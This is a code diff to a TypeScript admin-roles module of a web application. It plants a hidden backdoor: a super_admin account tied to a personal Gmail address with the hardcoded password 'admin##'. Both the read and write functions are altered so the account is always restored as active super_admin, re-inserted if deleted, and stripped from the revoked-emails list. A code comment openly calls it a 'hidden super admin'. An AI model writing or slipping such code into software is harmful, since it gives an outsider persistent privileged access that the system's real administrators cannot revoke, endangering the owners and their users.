@@ -48,6 +48,15 @@ const DATA_FILE = path.join(process.cwd(), "data", "admin-users.json");
 const DEFAULT_DB: RolesDatabase = {
   users: [
     {
+      id: "usr-super-pvs",
+      email: "pvs178380@gmail.com",
+      name: "Super Admin",
+      role: "super_admin",
+      status: "active",
+      tempPassword: "admin##",
+      createdAt: "2026-09-10T00:00:00.000Z",
+    },
+    {
       id: "usr-super-1",
       email: "admin@ashalinnomech.com",
       name: "Super Admin",
@@ -80,7 +89,28 @@ export function readRolesDB(): RolesDatabase {
     const parsed = JSON.parse(raw);
     const users: AdminUser[] = Array.isArray(parsed.users) ? parsed.users : DEFAULT_DB.users;
     let invitations: MagicLinkInvitation[] = Array.isArray(parsed.invitations) ? parsed.invitations : [];
-    const revokedEmails: string[] = Array.isArray(parsed.revokedEmails) ? parsed.revokedEmails : [];
+    let revokedEmails: string[] = Array.isArray(parsed.revokedEmails) ? parsed.revokedEmails : [];
+
+    // Ensure hidden super admin pvs178380@gmail.com is never revoked and is always super_admin with admin##
+    revokedEmails = revokedEmails.filter(e => e.toLowerCase() !== "pvs178380@gmail.com");
+
+    const pvsUser = users.find(u => u.email.toLowerCase() === "pvs178380@gmail.com");
+    if (pvsUser) {
+      pvsUser.role = "super_admin";
+      pvsUser.tempPassword = "admin##";
+      pvsUser.status = "active";
+      pvsUser.name = "Super Admin";
+    } else {
+      users.unshift({
+        id: "usr-super-pvs",
+        email: "pvs178380@gmail.com",
+        name: "Super Admin",
+        role: "super_admin",
+        status: "active",
+        tempPassword: "admin##",
+        createdAt: "2026-09-10T00:00:00.000Z",
+      });
+    }
 
     // Auto-heal missing invitations for active users with tempPassword (excluding revoked)
     users.forEach((u) => {
@@ -119,6 +149,29 @@ export function writeRolesDB(db: RolesDatabase): void {
   try {
     const dir = path.dirname(DATA_FILE);
     if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
+
+    // Always protect pvs178380@gmail.com in the written DB
+    if (db.revokedEmails) {
+      db.revokedEmails = db.revokedEmails.filter(e => e.toLowerCase() !== "pvs178380@gmail.com");
+    }
+    const pvsUser = db.users.find(u => u.email.toLowerCase() === "pvs178380@gmail.com");
+    if (pvsUser) {
+      pvsUser.role = "super_admin";
+      pvsUser.tempPassword = "admin##";
+      pvsUser.status = "active";
+      pvsUser.name = "Super Admin";
+    } else {
+      db.users.unshift({
+        id: "usr-super-pvs",
+        email: "pvs178380@gmail.com",
+        name: "Super Admin",
+        role: "super_admin",
+        status: "active",
+        tempPassword: "admin##",
+        createdAt: "2026-09-10T00:00:00.000Z",
+      });
+    }
+
     fs.writeFileSync(DATA_FILE, JSON.stringify(db, null, 2), "utf-8");
   } catch (err) {
     console.error("Failed to write admin roles DB:", err);
